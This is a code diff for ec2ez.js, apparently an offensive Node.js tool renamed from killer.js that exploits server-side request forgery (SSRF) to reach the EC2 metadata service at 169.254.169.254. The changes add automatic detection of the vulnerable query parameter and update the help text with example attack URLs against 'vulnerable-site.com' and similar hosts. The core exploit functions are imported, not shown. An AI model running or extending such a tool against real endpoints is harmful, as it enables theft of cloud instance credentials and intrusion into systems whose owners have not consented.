@@ -6,6 +6,7 @@ import {
   logError,
   logSeparator,
   log,
+  extractSSRFParam,
 } from "./src/utils.js";
 import {
   testSSRFVulnerability,
@@ -51,18 +52,20 @@ ${COLORS.bright}OPTIONS:${COLORS.reset}
   ${COLORS.green}-h, --help${COLORS.reset}           Show this help message and exit
 
 ${COLORS.bright}EXAMPLES:${COLORS.reset}
-  ${COLORS.dim}# Example 1: Standard proxy endpoint${COLORS.reset}
-  node ec2ez.js http://vulnerable-site.com/proxy
+  ${COLORS.dim}# Example 1: Endpoint with 'url' parameter${COLORS.reset}
+  node ec2ez.js http://vulnerable-site.com/proxy?url=
 
-  ${COLORS.dim}# Example 2: API fetch endpoint${COLORS.reset}
-  node ec2ez.js http://api.example.com/fetch
+  ${COLORS.dim}# Example 2: Endpoint with 'target' parameter${COLORS.reset}
+  node ec2ez.js http://api.example.com/fetch?target=
 
-  ${COLORS.dim}# Example 3: Download endpoint${COLORS.reset}
-  node ec2ez.js https://target.com/api/v1/download
+  ${COLORS.dim}# Example 3: Endpoint with 'endpoint' parameter${COLORS.reset}
+  node ec2ez.js https://target.com/download?endpoint=
 
-  ${COLORS.dim}# Tool appends: ?url=http://169.254.169.254/... by default${COLORS.reset}
-  ${COLORS.dim}# To use different param name (target, endpoint, etc.),${COLORS.reset}
-  ${COLORS.dim}# modify CONFIG.ssrf.paramName in src/config.js${COLORS.reset}
+  ${COLORS.dim}# Example 4: No parameter (defaults to 'url')${COLORS.reset}
+  node ec2ez.js http://site.com/proxy
+
+  ${COLORS.green}✓${COLORS.reset} ${COLORS.dim}Tool auto-detects the parameter name from your URL!${COLORS.reset}
+  ${COLORS.dim}  Just include the query parameter in the URL and it will be extracted${COLORS.reset}
 
 ${COLORS.bright}WHAT IT DOES:${COLORS.reset}
   1. Tests if the proxy is vulnerable to SSRF
@@ -108,19 +111,24 @@ async function main() {
   if (!proxyUrl) {
     logError("Missing required argument: SSRF endpoint URL");
     console.log(
-      `${COLORS.yellow}Usage: node killer.js <ssrf-endpoint-url>${COLORS.reset}`
+      `${COLORS.yellow}Usage: node ec2ez.js <ssrf-endpoint-url>${COLORS.reset}`
     );
     console.log(
-      `${COLORS.dim}Example: node killer.js http://vulnerable-site.com/proxy${COLORS.reset}`
+      `${COLORS.dim}Example: node ec2ez.js http://vulnerable-site.com/proxy?url=${COLORS.reset}`
     );
     console.log(
-      `${COLORS.dim}         node killer.js http://api.example.com/fetch${COLORS.reset}`
+      `${COLORS.dim}         node ec2ez.js http://api.example.com/fetch?target=${COLORS.reset}`
     );
     console.log(
-      `${COLORS.dim}Run 'node killer.js --help' for more information${COLORS.reset}\n`
+      `${COLORS.dim}Run 'node ec2ez.js --help' for more information${COLORS.reset}\n`
     );
     process.exit(1);
   }
+
+  // Auto-detect SSRF parameter from URL
+  const ssrfParam = extractSSRFParam(proxyUrl);
+  CONFIG.ssrf.paramName = ssrfParam;
+  logSeparator();
 
   try {
     const isVulnerable = await testSSRFVulnerability(proxyUrl);
